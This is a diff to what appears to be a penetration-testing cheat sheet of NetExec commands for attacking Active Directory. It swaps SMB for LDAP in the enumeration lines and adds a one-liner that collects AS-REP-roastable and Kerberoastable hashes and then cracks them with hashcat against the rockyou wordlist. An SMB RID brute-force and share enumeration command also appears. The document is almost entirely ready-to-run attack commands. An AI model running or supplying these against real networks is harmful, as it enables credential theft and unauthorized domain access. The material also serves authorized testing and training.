@@ -18,12 +18,12 @@ nxc smb <ip> -u 'a' -p '' --shares --users --pass-pol --rid-brute 10000 --log $(
 
 ## LDAP anonymous all in one
 ```
-nxc smb <ip> -u ''
+nxc ldap <ip> -u '' -p ''
 ```
 
 ## LDAP all in one
 ```
-nxc smb <ip> -u '<user>' -p '<passwd>' --users --asreproast hashes.asreproast --kerberoasting hashes.kerberoast
+nxc ldap <ip> -u '<user>' -p '<passwd>' --users --asreproast hashes.asreproast --kerberoasting hashes.kerberoast; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
 ```
 
 ## Execute bloodhound
